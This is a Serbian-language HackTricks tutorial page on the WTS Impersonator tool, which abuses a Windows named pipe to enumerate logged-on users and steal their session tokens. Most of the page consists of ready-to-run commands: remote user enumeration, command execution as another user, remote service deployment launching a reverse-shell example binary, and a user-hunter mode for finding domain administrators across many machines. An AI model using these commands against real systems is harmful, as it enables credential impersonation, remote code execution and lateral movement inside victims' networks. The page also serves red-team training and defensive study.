<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**WTS Impersonator** alat eksploatiše **"\\pipe\LSM_API_service"** RPC Imenovani cev da neprimetno enumeriše prijavljene korisnike i preuzme njihove tokene, zaobilazeći tradicionalne tehnike impersonacije tokena. Ovaj pristup olakšava bezbolno lateralno kretanje unutar mreža. Inovacija iza ove tehnike pripisuje se **Omri Baso-u, čiji rad je dostupan na [GitHub-u](https://github.com/OmriBaso/WTSImpersonator)**.

### Osnovna Funkcionalnost
Alat funkcioniše putem niza API poziva:
```powershell
WTSEnumerateSessionsA → WTSQuerySessionInformationA → WTSQueryUserToken → CreateProcessAsUserW
```
### Ključni moduli i upotreba
- **Enumeracija korisnika**: Lokalna i udaljena enumeracija korisnika je moguća pomoću alata, korišćenjem komandi za oba scenarija:
- Lokalno:
```powershell
.\WTSImpersonator.exe -m enum
```
- Udaljeno, navođenjem IP adrese ili imena računara:
```powershell
.\WTSImpersonator.exe -m enum -s 192.168.40.131
```

- **Izvršavanje komandi**: Moduli `exec` i `exec-remote` zahtevaju **Servisni** kontekst da bi funkcionisali. Lokalno izvršavanje jednostavno zahteva izvršnu datoteku WTSImpersonator i komandu:
- Primer za lokalno izvršavanje komande:
```powershell
.\WTSImpersonator.exe -m exec -s 3 -c C:\Windows\System32\cmd.exe
```
- Može se koristiti PsExec64.exe za dobijanje servisnog konteksta:
```powershell
.\PsExec64.exe -accepteula -s cmd.exe
```

- **Udaljeno izvršavanje komandi**: Uključuje kreiranje i instaliranje servisa udaljeno slično kao PsExec.exe, omogućavajući izvršavanje sa odgovarajućim dozvolama.
- Primer udaljenog izvršavanja:
```powershell
.\WTSImpersonator.exe -m exec-remote -s 192.168.40.129 -c .\SimpleReverseShellExample.exe -sp .\WTSService.exe -id 2
```

- **Modul za traženje korisnika**: Cilja određene korisnike na više mašina, izvršavajući kod pod njihovim akreditacijama. Ovo je posebno korisno za ciljanje Administratora domena sa lokalnim administratorskim pravima na nekoliko sistema.
- Primer upotrebe:
```powershell
.\WTSImpersonator.exe -m user-hunter -uh DOMAIN/USER -ipl .\IPsList.txt -c .\ExeToExecute.exe -sp .\WTServiceBinary.exe
```
